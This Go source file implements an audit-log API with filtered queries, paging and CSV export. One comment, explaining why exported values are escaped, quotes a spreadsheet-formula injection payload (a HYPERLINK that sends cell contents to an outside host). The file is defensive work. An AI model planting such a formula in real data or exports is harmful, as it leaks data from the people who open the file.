package httpapi

import (
	"encoding/csv"
	"fmt"
	"net/http"
	"strconv"
	"strings"
	"time"

	"github.com/hkjang/invenqor/server/internal/storage"
)

// The audit log answers "who changed this, and when". The console used to fetch
// the newest few hundred entries and filter them in the browser, so a search for
// last week's deletion returned nothing and read as "no such record" - the worst
// possible answer from an accountability tool. Filtering, counting and paging
// belong in the query.

type auditFilter struct {
	Query        string
	Action       string
	Actor        string
	ResourceType string
	Result       string
	From         *time.Time
	To           *time.Time
	Limit        int
	Offset       int
}

func parseAuditFilter(request *http.Request) (auditFilter, error) {
	values := request.URL.Query()
	filter := auditFilter{
		Query:        strings.TrimSpace(values.Get("q")),
		Action:       strings.TrimSpace(values.Get("action")),
		Actor:        strings.TrimSpace(values.Get("actor")),
		ResourceType: strings.TrimSpace(values.Get("resource_type")),
		Result:       strings.TrimSpace(values.Get("result")),
		Limit:        queryInt(request, "limit", 100, 1, 500),
		Offset:       queryInt(request, "offset", 0, 0, 1_000_000),
	}
	for name, target := range map[string]**time.Time{
		"from": &filter.From,
		"to":   &filter.To,
	} {
		raw := strings.TrimSpace(values.Get(name))
		if raw == "" {
			continue
		}
		parsed, err := parseBoundary(raw, name == "to")
		if err != nil {
			return auditFilter{}, fmt.Errorf("%s must be RFC 3339 or YYYY-MM-DD", name)
		}
		*target = &parsed
	}
	if filter.From != nil && filter.To != nil && filter.To.Before(*filter.From) {
		return auditFilter{}, fmt.Errorf("to must not be earlier than from")
	}
	return filter, nil
}

// parseBoundary accepts a plain date as well as a full timestamp, because a
// date is what an operator types. A bare end date means the whole of that day.
func parseBoundary(raw string, endOfDay bool) (time.Time, error) {
	if parsed, err := time.Parse(time.RFC3339, raw); err == nil {
		return parsed.UTC(), nil
	}
	parsed, err := time.Parse("2006-01-02", raw)
	if err != nil {
		return time.Time{}, err
	}
	if endOfDay {
		return parsed.UTC().Add(24*time.Hour - time.Nanosecond), nil
	}
	return parsed.UTC(), nil
}

// conditions builds the shared WHERE clause. Timestamps are compared as
// arguments rather than through a dialect-specific date function, which keeps
// one statement correct on PostgreSQL and on the SQLite fallback.
func (filter auditFilter) conditions() (string, []any) {
	statement := " WHERE 1=1"
	arguments := make([]any, 0, 8)
	add := func(clause string, value any) {
		arguments = append(arguments, value)
		statement += fmt.Sprintf(clause, len(arguments))
	}
	if filter.Action != "" {
		add(" AND action = $%d", filter.Action)
	}
	if filter.ResourceType != "" {
		add(" AND resource_type = $%d", filter.ResourceType)
	}
	if filter.Result != "" {
		add(" AND result = $%d", filter.Result)
	}
	if filter.Actor != "" {
		add(
			" AND LOWER(actor_name) LIKE $%d"+storage.LikeEscapeClause,
			storage.LikeContains(strings.ToLower(filter.Actor)),
		)
	}
	if filter.Query != "" {
		add(
			` AND LOWER(action || ' ' || actor_name || ' ' || resource_type
			 || ' ' || COALESCE(resource_id,'') || ' ' || request_id
			 || ' ' || source_ip || ' ' || reason) LIKE $%d`+
				storage.LikeEscapeClause,
			storage.LikeContains(strings.ToLower(filter.Query)),
		)
	}
	if filter.From != nil {
		add(" AND occurred_at >= $%d", filter.From.UTC())
	}
	if filter.To != nil {
		add(" AND occurred_at <= $%d", filter.To.UTC())
	}
	return statement, arguments
}

const auditColumns = `id,occurred_at,actor_type,actor_id,actor_name,action,
	resource_type,resource_id,request_id,source_ip,user_agent,result,
	reason,before_json,after_json,metadata_json`

type auditRecord struct {
	ID           string
	OccurredAt   any
	ActorType    string
	ActorID      any
	ActorName    string
	Action       string
	ResourceType string
	ResourceID   any
	RequestID    string
	SourceIP     string
	UserAgent    string
	Result       string
	Reason       string
	Before       any
	After        any
	Metadata     any
}

func (s *Server) auditRecords(
	request *http.Request,
	filter auditFilter,
) ([]auditRecord, error) {
	where, arguments := filter.conditions()
	arguments = append(arguments, filter.Limit, filter.Offset)
	statement := "SELECT " + auditColumns + " FROM audit_logs" + where +
		fmt.Sprintf(
			" ORDER BY occurred_at DESC, id LIMIT $%d OFFSET $%d",
			len(arguments)-1, len(arguments),
		)
	rows, err := s.database.DB().QueryContext(
		request.Context(), statement, arguments...,
	)
	if err != nil {
		return nil, err
	}
	defer rows.Close()
	records := make([]auditRecord, 0, filter.Limit)
	for rows.Next() {
		var record auditRecord
		if err := rows.Scan(
			&record.ID, &record.OccurredAt, &record.ActorType, &record.ActorID,
			&record.ActorName, &record.Action, &record.ResourceType,
			&record.ResourceID, &record.RequestID, &record.SourceIP,
			&record.UserAgent, &record.Result, &record.Reason,
			&record.Before, &record.After, &record.Metadata,
		); err != nil {
			return nil, err
		}
		records = append(records, record)
	}
	return records, rows.Err()
}

func (s *Server) auditTotal(request *http.Request, filter auditFilter) (int64, error) {
	where, arguments := filter.conditions()
	var total int64
	err := s.database.DB().QueryRowContext(
		request.Context(),
		"SELECT COUNT(*) FROM audit_logs"+where,
		arguments...,
	).Scan(&total)
	return total, err
}

// auditFacets lists the values actually present, so the console's filters offer
// the actions this installation records rather than a list written by hand that
// drifts as features are added.
func (s *Server) auditFacets(request *http.Request) (map[string]any, error) {
	facets := map[string]any{}
	for key, column := range map[string]string{
		"actions":        "action",
		"resource_types": "resource_type",
		"results":        "result",
	} {
		rows, err := s.database.DB().QueryContext(
			request.Context(),
			"SELECT "+column+", COUNT(*) FROM audit_logs GROUP BY "+column+
				" ORDER BY COUNT(*) DESC, "+column+" LIMIT 60",
		)
		if err != nil {
			return nil, err
		}
		buckets := make([]statisticBucket, 0, 16)
		for rows.Next() {
			var bucket statisticBucket
			if err := rows.Scan(&bucket.Label, &bucket.Count); err != nil {
				rows.Close()
				return nil, err
			}
			buckets = append(buckets, bucket)
		}
		rows.Close()
		if err := rows.Err(); err != nil {
			return nil, err
		}
		facets[key] = buckets
	}
	return facets, nil
}

func (s *Server) listAudit(response http.ResponseWriter, request *http.Request) {
	filter, err := parseAuditFilter(request)
	if err != nil {
		writeAPIError(
			response, request, http.StatusBadRequest,
			"INVALID_AUDIT_FILTER", err.Error(),
		)
		return
	}
	records, err := s.auditRecords(request, filter)
	if err != nil {
		s.internalError(response, request, err)
		return
	}
	total, err := s.auditTotal(request, filter)
	if err != nil {
		s.internalError(response, request, err)
		return
	}
	facets, err := s.auditFacets(request)
	if err != nil {
		s.internalError(response, request, err)
		return
	}
	items := make([]map[string]any, 0, len(records))
	for _, record := range records {
		items = append(items, map[string]any{
			"id": record.ID, "occurred_at": apiTime(record.OccurredAt),
			"actor_type": record.ActorType, "actor_id": record.ActorID,
			"actor_name": record.ActorName, "action": record.Action,
			"resource_type": record.ResourceType,
			"resource_id":   record.ResourceID,
			"request_id":    record.RequestID, "source_ip": record.SourceIP,
			"user_agent": record.UserAgent, "result": record.Result,
			"reason": record.Reason,
			"before": rawJSON(record.Before), "after": rawJSON(record.After),
			"metadata": rawJSON(record.Metadata),
		})
	}
	writeJSON(response, http.StatusOK, map[string]any{
		"items":    items,
		"total":    total,
		"limit":    filter.Limit,
		"offset":   filter.Offset,
		"has_more": int64(filter.Offset+len(items)) < total,
		"facets":   facets,
	})
}

// exportAudit writes the filtered result as CSV. An audit extract is normally
// wanted as evidence outside the console, and asking an operator to copy rows
// out of a browser is how evidence gets transcribed wrongly.
// spreadsheetSafe stops a recorded value from becoming a formula.
//
// This file is served as an attachment for someone to open in a spreadsheet,
// and Excel and LibreOffice both execute a cell whose text begins with =, +, -
// or @. Two of the columns carry text a user chose: the reason typed on every
// change, and the actor name, which for a federated account is whatever the
// identity provider put in the claim.
//
// So a reason of =HYPERLINK("http://elsewhere/"&A1,"open") runs when an
// auditor opens the export - someone with more access than whoever wrote it,
// reading a file this product told them to download. A leading apostrophe is
// the convention for this: the spreadsheet shows the original text and does not
// evaluate it.
func spreadsheetSafe(value string) string {
	if value == "" {
		return value
	}
	switch value[0] {
	case '=', '+', '-', '@', '\t', '\r':
		return "'" + value
	}
	return value
}

// csvExportHeaders names the extract and says so when the row limit cut it
// short.
//
// Both exports read a bounded number of rows, and a result that reached the
// bound was written out as though it were the whole answer: an inventory
// hand-off missing hosts, an audit extract missing entries, with nothing in the
// file or the response to show it. A truncated evidence file is worse than a
// refused one, because the reader has no reason to doubt it.
//
// The name is the part that survives the download. A browser saves the file
// under whatever this says and the spreadsheet shows it in the title bar, so an
// extract that is missing rows arrives called partial, long after the response
// headers are gone. Those headers carry the same fact for an API client.
func csvExportHeaders(
	response http.ResponseWriter,
	name string,
	limit int,
	truncated bool,
) {
	response.Header().Set("Content-Type", "text/csv; charset=utf-8")
	if truncated {
		name += "-partial"
		response.Header().Set("X-Invenqor-Truncated", "true")
		response.Header().Set("X-Invenqor-Row-Limit", strconv.Itoa(limit))
	}
	response.Header().Set(
		"Content-Disposition",
		`attachment; filename="`+name+`.csv"`,
	)
}

func (s *Server) exportAudit(response http.ResponseWriter, request *http.Request) {
	filter, err := parseAuditFilter(request)
	if err != nil {
		writeAPIError(
			response, request, http.StatusBadRequest,
			"INVALID_AUDIT_FILTER", err.Error(),
		)
		return
	}
	filter.Offset = 0
	filter.Limit = queryInt(request, "limit", 5_000, 1, 50_000)
	// One row past the limit, so a result that ends exactly on it is not
	// reported as cut short.
	lookahead := filter
	lookahead.Limit = filter.Limit + 1
	records, err := s.auditRecords(request, lookahead)
	if err != nil {
		s.internalError(response, request, err)
		return
	}
	truncated := len(records) > filter.Limit
	if truncated {
		records = records[:filter.Limit]
	}
	csvExportHeaders(response, "invenqor-audit", filter.Limit, truncated)
	writer := csv.NewWriter(response)
	// A BOM so the export opens correctly in Excel, which is where an audit
	// extract usually ends up.
	_, _ = response.Write([]byte{0xEF, 0xBB, 0xBF})
	_ = writer.Write([]string{
		"occurred_at", "actor_type", "actor_name", "action", "result",
		"resource_type", "resource_id", "source_ip", "request_id", "reason",
	})
	for _, record := range records {
		occurred := ""
		if value := apiTime(record.OccurredAt); value != nil {
			occurred = fmt.Sprint(value)
		}
		_ = writer.Write([]string{
			occurred, record.ActorType, spreadsheetSafe(record.ActorName),
			record.Action, record.Result, record.ResourceType,
			optionalText(record.ResourceID),
			record.SourceIP, record.RequestID, spreadsheetSafe(record.Reason),
		})
	}
	writer.Flush()
	s.recordAdminAudit(
		request, "audit.export", "audit_log", "", nil,
		map[string]any{
			"rows": len(records), "truncated": truncated,
			"filter": filter.describe(),
		}, "",
	)
}

func (filter auditFilter) describe() map[string]any {
	described := map[string]any{"limit": filter.Limit}
	if filter.Query != "" {
		described["q"] = filter.Query
	}
	if filter.Action != "" {
		described["action"] = filter.Action
	}
	if filter.Actor != "" {
		described["actor"] = filter.Actor
	}
	if filter.ResourceType != "" {
		described["resource_type"] = filter.ResourceType
	}
	if filter.Result != "" {
		described["result"] = filter.Result
	}
	if filter.From != nil {
		described["from"] = filter.From.Format(time.RFC3339)
	}
	if filter.To != nil {
		described["to"] = filter.To.Format(time.RFC3339)
	}
	return described
}

func optionalText(value any) string {
	switch typed := value.(type) {
	case nil:
		return ""
	case string:
		return typed
	case []byte:
		return string(typed)
	case int64:
		return strconv.FormatInt(typed, 10)
	default:
		return fmt.Sprint(typed)
	}
}
